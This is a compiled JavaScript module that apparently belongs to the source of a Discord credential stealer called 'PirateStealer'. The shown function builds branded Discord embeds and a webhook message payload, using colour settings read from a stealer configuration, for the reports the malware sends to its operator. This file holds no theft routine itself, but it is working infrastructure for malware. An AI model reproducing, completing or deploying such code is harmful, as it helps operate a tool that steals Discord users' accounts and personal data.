"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.getBaseEmbeds = void 0;
const discord_js_1 = require("discord.js");
const log_1 = require("../log");
function getBaseEmbeds(config, embedsCount = 1) {
    const stealerName = "PirateStealer";
    const embeds = [];
    for (let i = 0; i < embedsCount; i++) {
        const embed = new discord_js_1.MessageEmbed();
        const color = config.getConfig()._stealerConfig["embed-color"];
        try {
            // will fail if invalid color
            embed.setColor(color);
        }
        catch (error) {
            (0, log_1.writeError)(error, `Unable to set color on base embed! Color type ${color}`);
        }
        embed.setAuthor(stealerName);
        embed.setFooter(stealerName);
        embeds.push(embed);
    }
    return {
        webhookMessage: () => {
            return {
                username: stealerName,
                embeds: embeds.map(e => e.toJSON()),
            };
        },
        embeds,
    };
}
exports.getBaseEmbeds = getBaseEmbeds;
